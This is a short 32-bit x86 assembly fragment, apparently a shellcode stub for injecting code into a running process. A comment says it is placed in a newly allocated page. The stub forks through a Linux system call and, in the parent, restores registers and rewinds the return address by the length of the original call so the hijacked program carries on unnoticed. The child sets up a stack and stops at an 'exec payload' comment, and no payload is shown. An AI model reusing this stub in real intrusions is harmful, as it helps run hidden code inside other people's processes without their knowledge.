; This is the code that will be placed in the newly allocated page

BITS 32

	; 
	;fork spawn
	;

    mov ecx,eax
	xor eax,eax
	inc eax
	inc eax
	int 0x80	; call fork
	test eax,eax
	jz child


	popa		; parent return
	sub dword [esp],5	; length of original call
    ret
child:
    mov esp,ecx
    sub esp,2048
	; exec payload
